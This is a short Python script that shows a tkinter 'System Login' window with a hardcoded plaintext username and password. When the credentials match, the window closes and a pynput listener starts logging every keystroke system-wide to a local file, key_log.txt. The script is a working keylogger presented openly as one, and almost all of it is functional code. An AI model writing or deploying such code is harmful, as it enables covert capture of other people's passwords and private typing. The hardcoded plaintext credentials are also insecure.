import tkinter as tk
from tkinter import messagebox
from pynput.keyboard import Listener

# Define your authorized credentials
AUTHORIZED_USER = "admin"
AUTHORIZED_PASS = "securepassword123"

# Keylogger logic
def log_keystrokes(key):
    key_str = str(key).replace("'", "")
    with open("key_log.txt", "a") as log_file:
        log_file.write(key_str + "\n")

def start_logging():
    with Listener(on_press=log_keystrokes) as listener:
        listener.join()

# GUI login logic
def handle_login():
    username = entry_user.get()
    password = entry_pass.get()
    
    if username == AUTHORIZED_USER and password == AUTHORIZED_PASS:
        messagebox.showinfo("Success", "Login Successful! Keylogger starting.")
        root.destroy()  # Close the login window
        start_logging() # Start the listener
    else:
        messagebox.showerror("Error", "Invalid username or password.")

# Create the visual window
root = tk.Tk()
root.title("System Login")
root.geometry("300x150")

# Username layout
tk.Label(root, text="Username:").pack(pady=5)
entry_user = tk.Entry(root)
entry_user.pack()

# Password layout (hides text with '*')
tk.Label(root, text="Password:").pack(pady=5)
entry_pass = tk.Entry(root, show="*")
entry_pass.pack()

# Clickable Login Button
btn_login = tk.Button(root, text="Log In", command=handle_login)
btn_login.pack(pady=10)

if __name__ == "__main__":
    root.mainloop()
